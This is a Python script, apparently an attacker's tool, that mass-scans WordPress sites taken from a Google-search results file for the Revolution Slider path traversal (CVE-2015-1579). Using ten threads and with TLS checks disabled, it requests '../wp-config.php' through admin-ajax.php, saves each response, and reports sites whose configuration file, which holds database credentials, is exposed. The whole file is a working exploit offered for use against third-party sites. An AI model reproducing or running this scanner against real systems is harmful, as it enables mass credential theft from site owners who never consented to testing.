import os
from lxml import html as lh
from queue import Queue
from urllib.parse import urlparse
from threading import Thread
import requests
import threading
from requests import get
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

lock = threading.Lock()

class Wordpress_CVE_2015_1579():

    def __init__(self, filename):
        self.filename = filename
        self.urls = self.wp_cve()

    @staticmethod
    def banner():
        os.system('clear')
        print("\n")
        print(" █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ ")
        print("██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗")
        print("███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝")
        print("██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗")
        print("██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║")
        print("╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝")
        print("      Wordpress CVE 2015 1579 Checker - anarcoder at protonmail.com\n") 

    def remove_duplicate_targets(self):
        results = [line.rstrip('\n') for line in open(self.filename)]
        url_lists = []
        for url in results:
            try:
                urlp = urlparse(url)
                urlp = urlp.scheme + '://' + urlp.netloc
                url_lists.append(urlp)
            except:
                pass
        url_lists = set(url_lists)
        url_lists = list(url_lists)
        return url_lists
    
    def check_vuln(self, q):
        while True:
            #with lock:
                url = q.get()
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; '
                           'Linux x86_64; rv:41.0) Gecko/20100101 '
                           'Firefox/41.0'}
                wp_config = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php'
                try:
                    url = url + wp_config
                    filename = urlparse(url)
                    filename = 'vuln_' + filename.netloc
                    req = get(url, headers=headers, verify=False, timeout=25)
                    if req.status_code == 200:
                        print('[+] Trying target: '+url)
                        with open(filename, 'wb') as f:
                            for chunk in req.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                        arq = open(filename,'r')
                        if '<?php' in arq.readline():
                            print('[+] \033[31mVulnerable!!\033[33m wp-config exposed..\033[39m\n')
                        else:
                            print('[-] Not vulnerable\n')
                        arq.close()
                        q.task_done()
                except:
                    print('[-] Exception - Not vulnerable\n')
                    q.task_done()
                q.task_done()
                os.system('rm -rf vuln_*')

    def wp_cve(self):
        self.banner()

        # Removing duplicate targets
        url_lists = self.remove_duplicate_targets()
        print(len(url_lists))

        # My Queue
        q = Queue(maxsize=0)

        # Number of threads
        num_threads = 10

        for url in url_lists:
            q.put(url)

        # My threads
        print('[*] Starting evil threads =)...\n')
        for i in range(num_threads):
            worker = Thread(target=self.check_vuln, args=(q,))
            worker.setDaemon(True)
            worker.start()

        q.join()


def main():
    filename = 'results_google_search.txt'
    Wordpress_CVE_2015_1579(filename)


if __name__ == '__main__':
    main()
